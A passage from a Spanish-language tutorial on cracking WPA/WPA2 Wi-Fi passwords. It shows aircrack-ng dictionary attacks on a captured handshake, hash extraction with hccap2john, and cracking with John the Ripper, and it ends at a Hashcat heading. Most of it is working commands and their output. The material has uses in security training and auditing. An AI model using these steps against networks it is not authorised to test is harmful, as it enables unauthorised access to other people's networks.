[roo@arch ~]# aircrack-ng -w /usr/share/wordlist/rockyou.txt Captura-01.cap
```
```bash
                              Aircrack-ng 1.5.2 

      [00:00:43] 487370/9822769 keys tested (7440.27 k/s) 

      Time left: 20 minutes, 54 seconds                          4.96%

                           KEY FOUND! [ password129 ]


      Master Key     : 9C E8 4E 94 F4 08 12 AC 1F 06 C9 5F CF C8 DE D5 
                       EC 70 5C 4B 73 FE 52 7B 02 29 9F 9A 88 E2 B3 74 

      Transient Key  : C6 21 8D E8 62 DD B2 A7 48 65 52 AA E0 C0 8E 85 
                       1B 63 D0 1D 9C C0 47 12 DA BF E1 63 12 01 8C 75 
                       D3 EF AE C5 E4 62 B7 C7 6E DE D1 05 9D 67 81 BF 
                       E7 94 71 D0 8D FE 92 17 61 AC 44 BA 48 E6 F7 B3 

      EAPOL HMAC     : 1A EB 42 13 85 E4 A1 FC 99 AF AA 97 4D AA EE 25
```

Y así comenzará este ataque de **fuerza bruta**. Ahora es cuestión de tiempo para que la contraseña sea descifrada. Algunas recomendaciones o tips: este diccionario popular solo es útil para contraseñas comunes. Si la contraseña es más larga o complicada, tomará más tiempo o incluso es posible que no se encuentre.

Depende mucho de la **CPU** que tengamos, ya que nos permitirá probar más contraseñas por segundo y, de esta manera, tendremos más facilidad para encontrar la contraseña.

Aunque más tarde les enseñaré a optimizar nuestra velocidad de cómputo y así poder probar más contraseñas por segundo.

### Crackeo con John The Ripper

La herramienta que vamos a usar, **John The Ripper**. sirve para hacer fuerza bruta y crackear contraseñas de redes inalámbricas. Antes de explicar como usarla, tenemos que saber como instalarla, a continuación la instalación.

#### Instalación

**Para distros basadas en debian/ubuntu**
```bash
[user@kali ~]$ sudo apt update && sudo apt upgrade -y
[user@kali ~]$ sudo apt install john
```
**Para distros basadas en arch-linux**
```bash
[user@arch ~]$ sudo pacman -Syu
[user@arch ~]$ sudo pacman -S john
```

#### Usó de John The Ripper

Bueno primero necestiamos el hash de la contraseña de la red inalambrica, supongamos que ya tenemos la la captura con el handshake bien generado, ahora ya habiendo entendido esto pasemos a ala extraccion del hash

```bash
[root@arch ~]# aircrack-ng -J miNuevaCaptura Captura-01.cap
Opening Captura-01.cape wait...
Read 5110 packets.

   #  BSSID              ESSID                     Encryption

   1  15:E7:95:73:D4:90  testwifi                   WPA (1 handshake)

Choosing first network as target.

Opening Captura-01.cape wait...
Read 5110 packets.

1 potential targets



Building Hashcat file...

[*] ESSID (length: 7): hacklab
[*] Key version: 2
[*] BSSID: 20:34:FB:B1:C5:53
[*] STA: 34:41:5D:46:D1:38
[*] anonce:
    FE AD BB C5 CA AC 3C 41 52 56 B1 44 5D 61 29 2A 
    72 E1 7D 73 6A 5E 16 A5 15 88 E4 9E 58 42 EC 78 
[*] snonce:
    47 5D 5A 50 E4 2D 1D 18 F8 67 5B 0A B6 B1 FF 1F 
    6A 85 82 EC 66 3E 92 2A F0 CC B2 05 F3 8B DE E0 
[*] Key MIC:
    0C 0E B7 91 69 C1 FE FD E5 D9 08 42 2E E4 A5 3C
[*] eapol:
    01 03 00 75 02 01 0A 00 00 00 00 00 00 00 00 00 
    01 47 5D 5A 50 E4 2D 1D 18 F8 67 5B 0A B6 B1 FF 
    1F 6A 85 82 EC 66 3E 92 2A F0 CC B2 05 F3 8B DE 
    E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
    00 00 16 30 14 01 00 00 0F AC 04 01 00 00 0F AC 
    04 01 00 00 0F AC 02 00 00 

Successfully written to miNuevaCaptura.hccap
```
```bash
[roo@arch ~]# ls
Captura-01.cap  miNuevaCaptura.hccap
```

Ahora, para poder ver el hash, necesitaremos una herramienta de la suite de John the Ripper llamada hccap2john, que nos permitirá visualizar el hash de manera clara y correcta.

```bash 
[root@arch ~]# hccap2john miNuevaCaptura.hccap > miHash 
[root@arch ~]# cat miHash 
testwifi:$WPAPSK$testwifi#3bJdA9RfU7GB2wK5m5uYrZXk9Q8S0PsdQkF4w8pRvo0n16sFfqV9L9Bh6TtUb7k5jVhTeCZxQFwV27A1jcXzMcttqgxH9oVqW41V7uLz4D5
```

Lo siguiente que haremos después de verificar que el hash se haya generado correctamente, será crackearlo. La sintaxis es la siguiente:

```bash
[root@arch ~]# john --wordlist==/usr/share/wordlists/rockyou.txt miHash --format=wpapsk
Using default input encoding: UTF-8
Loaded 1 password hash (wpapsk, WPA/WPA2/PMF/PMKID PSK [PBKDF2-SHA1 256/256 AVX2 8x])
No password hashes left to crack (see FAQ)
```

Una vez que hayamos encontrado la contraseña, debemos verla, ¿no? Así podremos verificar si es la correcta.

```bash
[root@arch ~]# john --show --format=wpapsk miHash
testwifi:password129:34-41-5d-46-d1-38:20-34-fb-b1-c5-53:3022aff1c113::WPA2:miNueavCaptura.hccap

1 password hash cracked, 0 left
```

### Crackeo con Hashcat

